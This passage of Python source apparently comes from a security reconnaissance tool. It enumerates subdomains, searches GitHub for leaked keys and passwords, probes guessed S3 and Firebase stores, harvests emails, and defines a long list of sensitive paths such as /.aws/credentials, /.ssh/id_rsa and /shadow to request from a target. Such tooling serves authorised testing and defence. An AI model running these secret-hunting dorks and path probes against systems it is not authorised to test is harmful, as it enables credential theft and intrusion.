        result["wildcard_detected"] = self.wildcard_detected
        result["details"] = "\n".join(detail_lines)
        
        return result
    
    def _crt_sh_enum(self) -> Set[str]:
        """Enumerate subdomains via crt.sh certificate transparency."""
        subs = set()
        try:
            resp = Utils.get(f"https://crt.sh/?q=%25.{self.domain}&output=json", timeout=30)
            if resp and resp.status_code == 200:
                data = resp.json()
                for entry in data:
                    name = entry.get("name_value", "")
                    if name:
                        for n in name.split("\n"):
                            n = n.strip().lower()
                            if n.endswith(f".{self.domain}") or n == self.domain:
                                # Remove wildcard prefix
                                if n.startswith("*."):
                                    n = n[2:]
                                if Utils.is_valid_domain(n):
                                    subs.add(n)
        except:
            pass
        return subs
    
    def _hackertarget_enum(self) -> Set[str]:
        """Enumerate via hackertarget API."""
        subs = set()
        try:
            resp = Utils.get(f"https://api.hackertarget.com/hostsearch/?q={self.domain}", timeout=30)
            if resp and resp.status_code == 200:
                for line in resp.text.strip().split("\n"):
                    parts = line.split(",")
                    if parts and len(parts) >= 1:
                        sub = parts[0].strip().lower()
                        if sub.endswith(f".{self.domain}") or sub == self.domain:
                            if Utils.is_valid_domain(sub):
                                subs.add(sub)
        except:
            pass
        return subs
    
    def _securitytrails_enum(self) -> Set[str]:
        """Enumerate via SecurityTrails API."""
        subs = set()
        try:
            resp = Utils.get(
                f"https://api.securitytrails.com/v1/domain/{self.domain}/subdomains",
                headers={"APIKEY": Config.SECURITYTRAILS_API_KEY},
                timeout=15
            )
            if resp and resp.status_code == 200:
                data = resp.json()
                for sub in data.get("subdomains", []):
                    full = f"{sub}.{self.domain}".lower()
                    if Utils.is_valid_domain(full):
                        subs.add(full)
        except:
            pass
        return subs
    
    def _google_dork_subdomains(self) -> Set[str]:
        """Discover subdomains via Google dork patterns (public sources)."""
        subs = set()
        dork_sources = [
            f"https://crt.sh/?q=%25.{self.domain}&output=json",
            f"https://www.virustotal.com/vtapi/v2/domain/report?apikey={Config.VIRUSTOTAL_API_KEY}&domain={self.domain}",
            f"https://dnsdumpster.com/",
        ]
        # Use threatcrowd open API
        try:
            resp = Utils.get(f"https://www.threatcrowd.org/searchApi/v2/domain/report/?domain={self.domain}", timeout=15)
            if resp and resp.status_code == 200:
                data = resp.json()
                for sub in data.get("subdomains", []):
                    sub = sub.strip().lower()
                    if Utils.is_valid_domain(sub):
                        subs.add(sub)
        except:
            pass
        
        # Use alienvault OTX
        try:
            resp = Utils.get(f"https://otx.alienvault.com/api/v1/indicators/domain/{self.domain}/passive_dns", timeout=15)
            if resp and resp.status_code == 200:
                data = resp.json()
                for entry in data.get("passive_dns", []):
                    sub = entry.get("hostname", "").strip().lower()
                    if sub and (sub.endswith(f".{self.domain}") or sub == self.domain):
                        if Utils.is_valid_domain(sub):
                            subs.add(sub)
        except:
            pass
        
        return subs
    
    def _dns_bruteforce(self) -> Set[str]:
        """Brute force subdomains using wordlist."""
        subs = set()
        try:
            with open(Config.SUBDOMAIN_WORDLIST, 'r', encoding='utf-8', errors='ignore') as f:
                words = [line.strip().lower() for line in f if line.strip()]
        except:
            # Fallback to common subdomains
            words = ["www", "mail", "ftp", "admin", "api", "dev", "test", "stage", "blog", 
                     "cdn", "static", "img", "assets", "portal", "vpn", "ssh", "webmail",
                     "cpanel", "whm", "ns1", "ns2", "mx", "remote", "support", "help",
                     "status", "app", "m", "mobile", "shop", "store", "docs", "wiki",
                     "git", "jenkins", "jira", "confluence", "grafana", "prometheus",
                     "kibana", "elastic", "logs", "monitor", "dashboard", "analytics",
                     "demo", "beta", "alpha", "sandbox", "staging", "prod", "production",
                     "backup", "db", "database", "sql", "redis", "cache", "queue",
                     "ns1", "ns2", "ns3", "ns4", "dns1", "dns2", "smtp", "pop3", "imap",
                     "owa", "exchange", "autodiscover", "lync", "skype", "teams",
                     "devops", "ci", "cd", "build", "release", "deploy", "pipeline",
                     "s3", "bucket", "storage", "files", "download", "uploads",
                     "proxy", "gateway", "firewall", "waf", "loadbalancer", "lb",
                     "auth", "login", "sso", "oauth", "identity", "idp", "saml",
                     "pay", "payment", "checkout", "billing", "invoice",
                     "newsletter", "notifications", "push", "ws", "wss", "socket",
                     "stream", "video", "media", "download", "file", "data",
                     "report", "reports", "export", "import", "sync", "integration"]
        
        def check_subdomain(word: str) -> Optional[str]:
            fqdn = f"{word}.{self.domain}"
            if fqdn in [f"{w}.{self.domain}" for w in words[:words.index(word)]]:
                return None
            try:
                socket.gethostbyname(fqdn)
                return fqdn
            except:
                pass
            return None
        
        with ThreadPoolExecutor(max_workers=Config.THREADS) as executor:
            futures = {executor.submit(check_subdomain, word): word for word in words[:5000]}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    subs.add(result)
        
        return subs
    
    def _dns_enumeration(self):
        """Enumerate various DNS record types."""
        for record_type in ['A', 'AAAA', 'CNAME', 'MX', 'NS', 'TXT', 'SOA']:
            try:
                answers = dns.resolver.resolve(self.domain, record_type, lifetime=10)
                for ans in answers:
                    val = str(ans).strip()
                    if val not in self.dns_records[record_type]:
                        self.dns_records[record_type].append(val)
            except:
                pass
    
    def _check_wildcard(self):
        """Check if wildcard DNS is enabled."""
        random_sub = f"{''.join(random.choices(string.ascii_lowercase, k=12))}.{self.domain}"
        try:
            socket.gethostbyname(random_sub)
            self.wildcard_detected = True
        except:
            self.wildcard_detected = False


# ═══════════════════════════════════════════════════════════════════════
# STAGE 2: OSINT
# ═══════════════════════════════════════════════════════════════════════

class OSINTEngine:
    """Open Source Intelligence gathering - deep dive."""
    
    def __init__(self, target: str):
        self.target = Utils.normalize_url(target)
        self.domain = Utils.extract_domain(target)
        self.session = Utils.get_session()
    
    def run(self) -> Dict:
        """Execute all OSINT modules."""
        result = {
            "github_leaks": [],
            "cloud_assets": [],
            "whois_info": {},
            "pastebin_leaks": [],
            "tech_stack": [],
            "email_addresses": [],
            "social_media": [],
            "dark_web_mentions": [],
            "certificate_info": {},
            "details": ""
        }
        
        detail_lines = ["=== OSINT DEEP DIVE ==="]
        
        # GitHub dorking for secrets
        github_results = self._github_dorking()
        result["github_leaks"] = github_results
        detail_lines.append(f"GitHub secrets/leaks: {len(github_results)} findings")
        
        # Cloud asset discovery
        cloud_results = self._cloud_asset_discovery()
        result["cloud_assets"] = cloud_results
        detail_lines.append(f"Cloud assets: {len(cloud_results)} findings")
        
        # WHOIS lookup
        whois_data = self._whois_lookup()
        result["whois_info"] = whois_data
        detail_lines.append(f"WHOIS: {whois_data.get('registrar', 'N/A')}")
        
        # Email harvesting
        emails = self._email_harvesting()
        result["email_addresses"] = emails[:30]
        detail_lines.append(f"Emails found: {len(emails)}")
        
        # Technology stack fingerprinting
        tech = self._tech_fingerprinting()
        result["tech_stack"] = tech
        detail_lines.append(f"Technologies: {', '.join(tech[:10])}")
        
        # Certificate analysis
        cert_info = self._certificate_analysis()
        result["certificate_info"] = cert_info
        if cert_info.get("issuer"):
            detail_lines.append(f"Certificate issuer: {cert_info['issuer']}")
        
        # Pastebin monitoring
        pastebin = self._pastebin_search()
        result["pastebin_leaks"] = pastebin
        detail_lines.append(f"Pastebin mentions: {len(pastebin)}")
        
        # Social media discovery
        social = self._social_media_discovery()
        result["social_media"] = social
        detail_lines.append(f"Social media: {len(social)} profiles")
        
        # Dark web (via public sources - no actual dark web access)
        dark = self._dark_web_monitoring()
        result["dark_web_mentions"] = dark
        detail_lines.append(f"Dark web mentions: {len(dark)}")
        
        result["details"] = "\n".join(detail_lines)
        return result
    
    def _github_dorking(self) -> List[Dict]:
        """Search GitHub for exposed secrets and sensitive data."""
        findings = []
        if not Config.GITHUB_TOKEN:
            return findings
        
        dork_queries = [
            f'"{self.domain}" "api_key"',
            f'"{self.domain}" "api-key"',
            f'"{self.domain}" "apikey"',
            f'"{self.domain}" "secret"',
            f'"{self.domain}" "password"',
            f'"{self.domain}" "token"',
            f'"{self.domain}" "aws_access_key"',
            f'"{self.domain}" "aws_secret_key"',
            f'"{self.domain}" "ssh"',
            f'"{self.domain}" "private_key"',
            f'"{self.domain}" "-----BEGIN"',
            f'"{self.domain}" "connection_string"',
            f'"{self.domain}" "jdbc:"',
            f'"{self.domain}" "mongodb://"',
            f'"{self.domain}" "postgres://"',
            f'"{self.domain}" "mysql://"',
            f'"{self.domain}" "redis://"',
            f'"{self.domain}" "slack" "token"',
            f'"{self.domain}" "slack" "webhook"',
            f'"{self.domain}" ".env"',
            f'"{self.domain}" "config" "password"',
            f'"{self.domain}" "firebase"',
        ]
        
        for query in dork_queries:
            try:
                resp = Utils.get(
                    "https://api.github.com/search/code",
                    params={"q": query, "per_page": 5},
                    headers={"Authorization": f"token {Config.GITHUB_TOKEN}", "Accept": "application/vnd.github.v3+json"},
                    timeout=10
                )
                if resp and resp.status_code == 200:
                    data = resp.json()
                    for item in data.get("items", []):
                        repo_name = item.get("repository", {}).get("full_name", "")
                        html_url = item.get("html_url", "")
                        file_path = item.get("path", "")
                        finding = {
                            "repo": repo_name,
                            "file": file_path,
                            "url": html_url,
                            "query": query
                        }
                        if finding not in findings:
                            findings.append(finding)
            except:
                continue
        
        return findings
    
    def _cloud_asset_discovery(self) -> List[Dict]:
        """Discover cloud assets (S3 buckets, Firebase, Azure, etc.)."""
        findings = []
        
        # S3 bucket permutations
        s3_perms = [
            self.domain.replace(".", ""), self.domain.replace(".", "-"),
            f"{self.domain.replace('.', '')}-assets",
            f"{self.domain.replace('.', '')}-backup",
            f"{self.domain.replace('.', '')}-data",
            f"{self.domain.replace('.', '')}-files",
            f"assets.{self.domain}",
            f"static.{self.domain}",
            f"uploads.{self.domain}",
            f"media.{self.domain}",
            f"cdn.{self.domain}",
            f"backup.{self.domain}",
            f"data.{self.domain}",
            f"files.{self.domain}",
            f"storage.{self.domain}",
            f"{self.domain.split('.')[0]}-assets",
            f"{self.domain.split('.')[0]}-backup",
            f"{self.domain.split('.')[0]}-data",
            f"{self.domain.split('.')[0]}-files",
        ]
        
        for bucket in s3_perms:
            # Check S3 bucket listing
            for region, endpoint in [
                ("us-east-1", "s3.amazonaws.com"),
                ("us-west-2", "s3-us-west-2.amazonaws.com"),
                ("eu-west-1", "s3-eu-west-1.amazonaws.com"),
            ]:
                try:
                    url = f"https://{bucket}.{endpoint}"
                    resp = Utils.get(url, timeout=5)
                    if resp:
                        if resp.status_code == 200:
                            findings.append({
                                "type": "S3 Bucket",
                                "url": url,
                                "status": "Public/Listable",
                                "region": region
                            })
                        elif resp.status_code == 403:
                            # Might exist but access denied
                            if resp.text and "AccessDenied" in resp.text:
                                pass  # Exists but denied != accessible
                            else:
                                findings.append({
                                    "type": "S3 Bucket",
                                    "url": url,
                                    "status": "Exists (access denied)",
                                    "region": region
                                })
                except:
                    continue
        
        # Firebase discovery
        firebase_names = [
            self.domain.replace(".", "-"),
            self.domain.replace(".", ""),
            f"{self.domain.split('.')[0]}",
            f"{self.domain.split('.')[0]}-prod",
            f"{self.domain.split('.')[0]}-dev",
            f"{self.domain.split('.')[0]}-staging",
        ]
        for fb_name in firebase_names:
            try:
                url = f"https://{fb_name}.firebaseio.com/.json"
                resp = Utils.get(url, timeout=5)
                if resp and resp.status_code != 404:
                    findings.append({
                        "type": "Firebase",
                        "url": url,
                        "status": f"HTTP {resp.status_code}" if resp else "No response"
                    })
            except:
                continue
        
        return findings
    
    def _whois_lookup(self) -> Dict:
        """Perform WHOIS lookup."""
        info = {}
        if WHOIS_AVAILABLE:
            try:
                w = whois.whois(self.domain)
                info["registrar"] = w.registrar or "N/A"
                info["creation_date"] = str(w.creation_date or "N/A")
                info["expiration_date"] = str(w.expiration_date or "N/A")
                info["name_servers"] = w.name_servers or []
                info["org"] = w.org or "N/A"
                info["country"] = w.country or "N/A"
                info["emails"] = w.emails or []
            except:
                pass
        return info
    
    def _email_harvesting(self) -> List[str]:
        """Harvest email addresses from various sources."""
        emails = set()
        
        # From web pages
        try:
            resp = Utils.get(self.target, timeout=10)
            if resp and resp.text:
                found = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.' + self.domain.split('.')[-1], resp.text)
                emails.update(found)
        except:
            pass
        
        # From crt.sh certificates
        try:
            resp = Utils.get(f"https://crt.sh/?q=%25.{self.domain}&output=json", timeout=15)
            if resp and resp.status_code == 200:
                for entry in resp.json():
                    for field in ['email', 'email_address', 'mail']:
                        email = entry.get(field, "")
                        if email and '@' in email:
                            emails.add(email.lower().strip())
        except:
            pass
        
        # From WHOIS
        if WHOIS_AVAILABLE:
            try:
                w = whois.whois(self.domain)
                if w.emails:
                    for e in w.emails:
                        if e and '@' in str(e):
                            emails.add(str(e).lower().strip())
            except:
                pass
        
        return sorted(emails)
    
    def _tech_fingerprinting(self) -> List[str]:
        """Identify technology stack."""
        techs = set()
        try:
            resp = Utils.get(self.target, timeout=10)
            if resp:
                extracted = Utils.extract_tech_stack(dict(resp.headers), resp.text or "")
                techs.update(extracted)
                
                # Additional checks
                body = resp.text or ""
                if "webpack" in body.lower():
                    techs.add("Webpack")
                if "gtm.start" in body:
                    techs.add("Google Tag Manager")
                if "google-analytics.com" in body or "ga.js" in body.lower():
                    techs.add("Google Analytics")
                if "facebook.net" in body.lower() or "connect.facebook" in body.lower():
                    techs.add("Facebook Pixel")
                if "cloudflare.com/cdn-cgi" in body:
                    techs.add("Cloudflare JS Challenge")
                if "recaptcha" in body.lower() or "g-recaptcha" in body.lower():
                    techs.add("reCAPTCHA")
                if "hcaptcha" in body.lower():
                    techs.add("hCaptcha")
        except:
            pass
        
        return sorted(techs)
    
    def _certificate_analysis(self) -> Dict:
        """Analyze SSL/TLS certificate."""
        info = {}
        if not Config.CERTIFICATE_ANALYSIS:
            return info
        
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with socket.create_connection((self.domain, 443), timeout=10) as sock:
                with ctx.wrap_socket(sock, server_hostname=self.domain) as ssock:
                    cert = ssock.getpeercert(binary_form=True)
                    if cert and CRYPTO_AVAILABLE:
                        from cryptography import x509
                        from cryptography.hazmat.backends import default_backend
                        parsed = x509.load_der_x509_certificate(cert, default_backend())
                        info["issuer"] = str(parsed.issuer.rfc4514_string())
                        info["subject"] = str(parsed.subject.rfc4514_string())
                        info["serial"] = str(parsed.serial_number)
                        info["not_before"] = str(parsed.not_valid_before_utc)
                        info["not_after"] = str(parsed.not_valid_after_utc)
                        # Check for SANs
                        try:
                            san = parsed.extensions.get_extension_for_class(x509.SubjectAlternativeName)
                            info["san"] = [str(name) for name in san.value]
                        except:
                            info["san"] = []
                        # Check if expired
                        info["expired"] = parsed.not_valid_after_utc < datetime.now(timezone.utc)
                    elif OPENSSL_AVAILABLE:
                        bio = OpenSSL.crypto.load_certificate(OpenSSL.crypto.FILETYPE_ASN1, cert)
                        info["issuer"] = str(bio.get_issuer())
                        info["subject"] = str(bio.get_subject())
                        info["serial"] = str(bio.get_serial_number())
        except:
            pass
        
        return info
    
    def _pastebin_search(self) -> List[Dict]:
        """Search for pastebin mentions of the domain."""
        findings = []
        try:
            resp = Utils.get(f"https://psbdmp.ws/api/v3/search?q={self.domain}", timeout=10)
            if resp and resp.status_code == 200:
                data = resp.json()
                for item in data.get("data", [])[:20]:
                    findings.append({
                        "id": item.get("id", ""),
                        "title": item.get("title", ""),
                        "url": f"https://pastebin.com/{item.get('id', '')}" if item.get('id') else ""
                    })
        except:
            pass
        return findings
    
    def _social_media_discovery(self) -> List[Dict]:
        """Discover social media profiles related to the target."""
        profiles = []
        social_platforms = [
            ("LinkedIn", f"https://www.linkedin.com/company/{self.domain.split('.')[0]}"),
            ("Twitter/X", f"https://x.com/{self.domain.split('.')[0]}"),
            ("GitHub", f"https://github.com/{self.domain.split('.')[0]}"),
            ("Facebook", f"https://www.facebook.com/{self.domain.split('.')[0]}"),
            ("Instagram", f"https://www.instagram.com/{self.domain.split('.')[0]}"),
            ("Medium", f"https://medium.com/@{self.domain.split('.')[0]}"),
            ("Reddit", f"https://www.reddit.com/r/{self.domain.split('.')[0]}"),
            ("YouTube", f"https://www.youtube.com/@{self.domain.split('.')[0]}"),
        ]
        
        for platform, url in social_platforms:
            try:
                resp = Utils.head(url, timeout=5)
                if resp and resp.status_code == 200:
                    profiles.append({"platform": platform, "url": url, "found": True})
            except:
                continue
        
        return profiles
    
    def _dark_web_monitoring(self) -> List[Dict]:
        """Monitor dark web mentions via public breach databases."""
        findings = []
        # Use public breach data services (intelx.io, dehashed, etc.)
        try:
            # IntelX (public API)
            resp = Utils.get(f"https://intelx.io/search?q={self.domain}&limit=10", timeout=10)
            if resp and resp.status_code == 200:
                # Parse results if available
                pass
        except:
            pass
        
        # Check haveibeenpwned domain search
        try:
            resp = Utils.get(f"https://haveibeenpwned.com/domain/{self.domain}", timeout=10)
            if resp:
                # Store the raw domain for breach checking
                findings.append({
                    "source": "haveibeenpwned",
                    "domain": self.domain,
                    "note": "Check manually for breach data"
                })
        except:
            pass
        
        return findings


# ═══════════════════════════════════════════════════════════════════════
# STAGE 3: WEB AUDIT
# ═══════════════════════════════════════════════════════════════════════

class WebAuditEngine:
    """Comprehensive web application security audit."""
    
    def __init__(self, target: str):
        self.target = Utils.normalize_url(target)
        self.domain = Utils.extract_domain(target)
        self.session = Utils.get_session()
        self.base_url = self.target.rstrip('/')
        self.findings = []
        self.screenshots = []
    
    # ─── Sensitive Paths ─────────────────────────────────────────────
    
    SENSITIVE_PATHS = [
        "/.env", "/.git/config", "/.gitignore", "/.git/HEAD", "/.svn/entries",
        "/.DS_Store", "/Thumbs.db", "/crossdomain.xml", "/clientaccesspolicy.xml",
        "/sitemap.xml", "/robots.txt", "/security.txt", "/humans.txt",
        "/wp-admin/", "/wp-content/", "/wp-includes/", "/wp-config.php.bak",
        "/administrator/", "/admin/", "/login", "/backup/", "/backups/",
        "/config/", "/configuration.php", "/config.php.bak", "/config.php.old",
        "/db/", "/database/", "/sql/", "/sql.txt", "/mysql.sql",
        "/phpmyadmin/", "/phpPgAdmin/", "/adminer.php",
        "/api/", "/swagger.json", "/swagger.yaml", "/openapi.json",
        "/graphql", "/graphiql", "/playground", "/api/graphql",
        "/.well-known/", "/.well-known/security.txt",
        "/server-status", "/server-info", "/cgi-bin/",
        "/test/", "/tests/", "/debug/", "/dev/", "/staging/",
        "/console/", "/management/", "/monitor/", "/health",
        "/healthz", "/readyz", "/metrics", "/prometheus",
        "/actuator", "/actuator/health", "/actuator/info",
        "/actuator/env", "/actuator/beans",
        "/phpinfo.php", "/info.php", "/test.php",
        "/webservice/", "/ws/", "/soap/", "/wsdl",
        "/composer.json", "/composer.lock", "/package.json",
        "/Dockerfile", "/docker-compose.yml", "/.dockerignore",
        "/Jenkinsfile", "/.travis.yml", "/.circleci/",
        "/nginx.conf", "/web.config", "/.htaccess", "/.htpasswd",
        "/error/", "/errors/", "/log/", "/logs/",
        "/export/", "/exports/", "/import/",
        "/webdav/", "/dav/", "/remote/",
        "/vpn/", "/citrix/", "/rdp/", "/terminal/",
        "/shell/", "/cmd/", "/exec/", "/run/",
        "/upload/", "/uploads/", "/download/", "/downloads/",
        "/files/", "/file/", "/docs/", "/documentation/",
        "/chat/", "/support/", "/help/", "/faq/",
        "/search", "/search/", "/api/search",
        "/sso/", "/oauth/", "/authorize", "/token",
        "/reset", "/forgot", "/register", "/signup",
        "/proxy/", "/redirect", "/redirect/", "/forward/",
        "/fetch/", "/external/", "/out/", "/outgoing/",
        "/load/", "/ajax/", "/api/load",
        "/export/logs", "/admin/export", "/api/export",
        "/internal/", "/private/", "/restricted/",
        "/swagger/", "/docs/", "/api/docs",
        "/webhook", "/webhooks/", "/callback/",
        "/api/health", "/api/status", "/api/version",
        "/api/users", "/api/admin", "/api/config",
        "/api/v1/", "/api/v2/", "/api/v3/",
        "/socket.io/", "/ws/", "/wss/", "/websocket",
        "/node_modules/", "/bower_components/",
        "/.npmrc", "/.yarnrc", "/yarn.lock",
        "/package-lock.json", "/requirements.txt",
        "/Pipfile", "/Gemfile", "/Gemfile.lock",
        "/Cargo.toml", "/Cargo.lock", "/go.mod",
        "/build.gradle", "/pom.xml", "/Makefile",
        "/.terraform/", "/terraform.tfstate",
        "/cloudformation/", "/serverless.yml",
        "/samconfig.toml", "/.serverless/",
        "/index.html", "/index.php", "/default.aspx",
        "/elmah.axd", "/trace.axd",
        "/_debug/", "/__debug/",
        "/jolokia", "/jolokia/", "/hawtio/",
        "/lucene/", "/solr/", "/elasticsearch/",
        "/kibana/", "/grafana/", "/prometheus/",
        "/rabbitmq/", "/management/",
        "/hazelcast/", "/memcached/",
        "/api-docs", "/api-docs.json", "/api-docs.yaml",
        "/v1/api-docs", "/v2/api-docs",
        "/crash", "/crashlog",
        "/env", "/environment",
        "/profiler/", "/xdebug/",
        "/dump/", "/dumps/", "/var/",
        "/temp/", "/tmp/", "/cache/",
        "/session/", "/sessions/",
        "/.elasticbeanstalk/",
        "/appspec.yml", "/taskdef.json",
        "/credentials", "/credentials.json",
        "/service-account.json", "/key.json",
        "/secret.json", "/secrets.json",
        "/config.json", "/settings.json",
        "/db.json", "/database.json",
        "/firebase.json", "/firebase-config.json",
        "/.google-services.json",
        "/GoogleService-Info.plist",
        "/key.pem", "/key.priv", "/private.pem",
        "/id_rsa", "/id_dsa",
        "/.ssh/", "/ssh/",
        "/cron", "/cronjob", "/crontab",
        "/batch/", "/batch.sh",
        "/deploy/", "/deploy.sh",
        "/setup/", "/install/", "/install.php",
        "/migration/", "/migrate/",
        "/upgrade/", "/update/",
        "/reindex/", "/rebuild/",
        "/translations/", "/lang/",
        "/themes/", "/plugins/", "/modules/",
        "/custom/", "/customizations/",
        "/templates/", "/views/",
        "/graphql/", "/graphql.php",
        "/rest/", "/rest/v1/", "/rest/v2/",
        "/odata/", "/odata/v1/", "/odata/v2/",
        "/soap/", "/xmlrpc/",
        "/rss", "/rss/", "/feed/", "/atom.xml",
        "/sitemap_index.xml", "/page-sitemap.xml",
        "/.well-known/acme-challenge/",
        "/.well-known/assetlinks.json",
        "/.well-known/apple-app-site-association",
        "/.well-known/brave-rewards-verification.txt",
        "/.well-known/change-password",
        "/.well-known/dnt-policy.txt",
        "/.well-known/gpc.json",
        "/.well-known/keybase.txt",
        "/.well-known/matrix/",
        "/.well-known/nodeinfo",
        "/.well-known/openid-configuration",
        "/.well-known/oauth-authorization-server",
        "/.well-known/posh/",
        "/.well-known/pki-validation/",
        "/.well-known/security.txt",
        "/.well-known/sshfp",
        "/.well-known/time/",
        "/.well-known/traffic-advice",
        "/.well-known/void",
        "/.well-known/assetlinks.json",
        "/.well-known/change-password-redirect",
        "/.well-known/posh",
        "/.well-known/dnt-policy.txt",
        "/.well-known/trust.txt",
        "/.well-known/gpc.json",
        "/.well-known/reputation",
        "/.well-known/owner",
        "/.well-known/caldav",
        "/.well-known/carddav",
        "/.well-known/ejabberd",
        "/.well-known/matrix",
        "/.well-known/mud",
        "/.well-known/time",
        "/.well-known/uma2-configuration",
        "/wp-admin",
        "/wp-login.php",
        "/wp-content",
        "/wp-includes",
        "/wp-json",
        "/wp-config.php.bak",
        "/wp-config.php.old",
        "/wp-config.php.save",
        "/wp-config.php~",
        "/wp-config.php.swp",
        "/xmlrpc.php",
        "/wp-content/debug.log",
        "/wp-content/uploads/",
        "/wp-content/plugins/",
        "/wp-content/themes/",
        "/administrator",
        "/admin",
        "/manager",
        "/backend",
        "/api",
        "/api/v1",
        "/api/v2",
        "/api/v3",
        "/graphql",
        "/graphiql",
        "/v1/graphql",
        "/console",
        "/swagger",
        "/swagger-ui",
        "/swagger.json",
        "/swagger.yaml",
        "/swagger.yml",
        "/api-docs",
        "/api/documentation",
        "/openapi.json",
        "/docs",
        "/rest-api",
        "/.env",
        "/.env.prod",
        "/.env.production",
        "/.env.dev",
        "/.env.development",
        "/.env.local",
        "/.env.staging",
        "/.env.test",
        "/.git",
        "/.git/config",
        "/.git/HEAD",
        "/.gitignore",
        "/.gitattributes",
        "/.svn",
        "/.svn/entries",
        "/.hg",
        "/.bzr",
        "/.DS_Store",
        "/sitemap.xml",
        "/robots.txt",
        "/crossdomain.xml",
        "/clientaccesspolicy.xml",
        "/security.txt",
        "/humans.txt",
        "/ads.txt",
        "/app-ads.txt",
        "/vendor/",
        "/node_modules",
        "/package.json",
        "/package-lock.json",
        "/yarn.lock",
        "/composer.json",
        "/composer.lock",
        "/Gemfile",
        "/Gemfile.lock",
        "/requirements.txt",
        "/Pipfile",
        "/Dockerfile",
        "/docker-compose.yml",
        "/.dockerignore",
        "/Makefile",
        "/Procfile",
        "/serverless.yml",
        "/terraform.tf",
        "/.terraform",
        "/k8s-deployment.yaml",
        "/helm-chart",
        "/.circleci",
        "/.github/workflows",
        "/Jenkinsfile",
        "/.gitlab-ci.yml",
        "/.travis.yml",
        "/bitbucket-pipelines.yml",
        "/.vscode",
        "/.idea",
        "/*.js.map",
        "/*.css.map",
        "/sourcemaps",
        "/error",
        "/error.log",
        "/debug",
        "/test",
        "/tests",
        "/testing",
        "/staging",
        "/dev",
        "/development",
        "/qa",
        "/uat",
        "/beta",
        "/alpha",
        "/sandbox",
        "/demo",
        "/internal",
        "/private",
        "/confidential",
        "/secret",
        "/hidden",
        "/temp",
        "/tmp",
        "/backup",
        "/backups",
        "/bak",
        "/old",
        "/archive",
        "/reports",
        "/export",
        "/import",
        "/upload",
        "/uploads",
        "/download",
        "/downloads",
        "/files",
        "/media",
        "/static",
        "/assets",
        "/dist",
        "/build",
        "/webroot",
        "/www",
        "/public",
        "/server-status",
        "/server-info",
        "/phpinfo.php",
        "/info.php",
        "/test.php",
        "/p.php",
        "/info",
        "/status",
        "/health",
        "/healthcheck",
        "/healthz",
        "/readyz",
        "/metrics",
        "/actuator",
        "/actuator/health",
        "/actuator/info",
        "/actuator/env",
        "/actuator/beans",
        "/actuator/metrics",
        "/actuator/loggers",
        "/actuator/httptrace",
        "/actuator/threaddump",
        "/actuator/heapdump",
        "/log",
        "/logs",
        "/logfile",
        "/logging",
        "/loglevel",
        "/config",
        "/configuration",
        "/cfg",
        "/settings",
        "/setup",
        "/install",
        "/install.php",
        "/installation",
        "/wizard",
        "/migration",
        "/upgrade",
        "/update",
        "/patch",
        "/register",
        "/signup",
        "/account",
        "/profile",
        "/user",
        "/users",
        "/customer",
        "/customers",
        "/client",
        "/clients",
        "/dashboard",
        "/panel",
        "/cpanel",
        "/phpmyadmin",
        "/pma",
        "/mysql",
        "/sql",
        "/db",
        "/database",
        "/phpPgAdmin",
        "/pgadmin",
        "/adminer",
        "/redis",
        "/elasticsearch",
        "/kibana",
        "/grafana",
        "/prometheus",
        "/jenkins",
        "/jira",
        "/confluence",
        "/gitlab",
        "/sonarqube",
        "/nexus",
        "/artifactory",
        "/webdav",
        "/samba",
        "/ftp",
        "/ssh",
        "/remote",
        "/desktop",
        "/vnc",
        "/proxy",
        "/gateway",
        "/vpn",
        "/sso",
        "/oauth",
        "/oauth2",
        "/callback",
        "/webhook",
        "/hooks",
        "/notification",
        "/notifications",
        "/push",
        "/socket.io",
        "/websocket",
        "/ws",
        "/wss",
        "/rtsp",
        "/stream",
        "/live",
        "/chat",
        "/presence",
        "/search",
        "/query",
        "/filter",
        "/sort",
        "/paginate",
        "/export/csv",
        "/export/pdf",
        "/export/json",
        "/import/csv",
        "/import/xml",
        "/api/health",
        "/api/status",
        "/api/version",
        "/api/config",
        "/api/swagger",
        "/api/graphql",
        "/api/rest",
        "/api/v1/health",
        "/api/v1/version",
        "/api/v1/docs",
        "/api/v1/users",
        "/api/v1/admin",
        "/api/v1/auth",
        "/api/v1/login",
        "/api/v1/register",
        "/api/v1/token",
        "/api/v1/refresh",
        "/api/v1/upload",
        "/api/v1/download",
        "/api/v2/health",
        "/api/v2/version",
        "/api/v2/docs",
        "/api/v2/users",
        "/api/v2/admin",
        "/api/v2/auth",
        "/api/v2/login",
        "/api/v2/register",
        "/api/v2/token",
        "/api/v2/refresh",
        "/api/v2/upload",
        "/api/v2/download",
        "/.env.example",
        "/.env.sample",
        "/.env.template",
        "/config.json",
        "/config.yaml",
        "/config.yml",
        "/config.php",
        "/config.js",
        "/config.xml",
        "/settings.json",
        "/settings.py",
        "/db.conf",
        "/database.conf",
        "/database.yml",
        "/datasource.properties",
        "/application.properties",
        "/application.yml",
        "/application.yaml",
        "/bootstrap.properties",
        "/log4j.properties",
        "/log4j2.xml",
        "/logback.xml",
        "/web.xml",
        "/struts.xml",
        "/spring.xml",
        "/applicationContext.xml",
        "/hibernate.cfg.xml",
        "/mybatis-config.xml",
        "/nginx.conf",
        "/apache.conf",
        "/httpd.conf",
        "/.htaccess",
        "/.htpasswd",
        "/.htgroup",
        "/passwd",
        "/shadow",
        "/master.passwd",
        "/sudoers",
        "/ssh/authorized_keys",
        "/ssh/id_rsa",
        "/ssh/id_dsa",
        "/ssh/known_hosts",
        "/.ssh/config",
        "/id_rsa",
        "/id_dsa",
        "/.ssh/id_rsa",
        "/.ssh/id_dsa",
        "/.pgpass",
        "/.my.cnf",
        "/.netrc",
        "/.aws/credentials",
        "/.aws/config",
        "/.azure/credentials",
        "/.gcp/credentials",
        "/credentials.json",
        "/cred.json",
        "/secret.json",
        "/private_key",
        "/key.pem",
        "/cert.pem",
        "/certificate.pem",
        "/fullchain.pem",
        "/privkey.pem",
        "/chain.pem",
        "/server.key",
        "/server.crt",
        "/client.key",
        "/client.crt",
        "/ca.key",
        "/ca.crt",
        "/bundle.pem",
        "/.npmrc",
        "/.yarnrc",
        "/.pypirc",
        "/.gem/credentials",
        "/.docker/config.json",
        "/token",
        "/tokens",
        "/api_key",
        "/apikey",
        "/api-keys",
        "/.well-known/security.txt",
        "/.well-known/security",
        "/.well-known/change-password",
        "/.well-known/pki-validation",
    ]

    # ---- Common API paths for REST/API discovery ----
